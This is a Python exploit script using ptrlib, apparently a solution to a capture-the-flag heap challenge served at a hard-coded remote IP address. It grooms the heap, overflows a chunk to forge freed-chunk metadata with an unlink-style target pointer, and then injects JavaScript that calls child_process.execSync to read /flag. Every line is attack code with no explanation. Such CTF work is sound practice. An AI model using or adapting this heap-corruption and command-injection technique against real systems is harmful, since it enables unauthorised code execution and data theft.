from ptrlib import *
import os
import atexit

def killnode():
    os.system("pkill node")
atexit.register(killnode)

def new(index, size, data=b''):
    sock.sendlineafter("choice>\n", "1")
    sock.sendlineafter("index>\n", str(index))
    sock.sendlineafter("size>\n", str(size))
    if size <= 0x80:
        sock.sendlineafter("content>\n", data)
def edit(index, data):
    sock.sendlineafter("choice>\n", "2")
    sock.sendlineafter("index>\n", str(index))
    sock.sendlineafter("content>\n", data)
def delete(index):
    sock.sendlineafter("choice>\n", "3")
    sock.sendlineafter("index>\n", str(index))

addr_target = 0x0000483

#sock = Socket("localhost", 2000)
sock = Socket("nc 1.230.253.91 2000")

# feng shui
new(0, 0x18, "A"*0x10)
new(1, 0x78, "B"*0x70)
new(2, 0x18, "C"*0x10)
new(3, 0x78, "D"*0x70)
new(2, 0x18, "E"*0x10)
delete(1)
delete(3)

# overflow
new(0, 0x1000)
payload  = b'A'*0x18
payload += p32(0) + p32(0x81)
payload += p32(0xdeadbeef) + p32(0xcafebabe)
payload += b'B'*0x70
payload += p32(0x80) + p32(0x22)
payload += b'C'*0x18
payload += p32(0) + p32(0x81)
payload += p32(addr_target-0xC) + p32(0xdeadbeef)
edit(0, payload)
new(3, 0x78, "X"*0x70)
payload = """;;;;
const {execSync}=require('child_process');
console.log(execSync("cat /flag").toString());
process.exit(0);
"""
payload = payload.replace("\n", "")
assert len(payload) < 0x78
new(1, 0x78, payload)

sock.interactive()
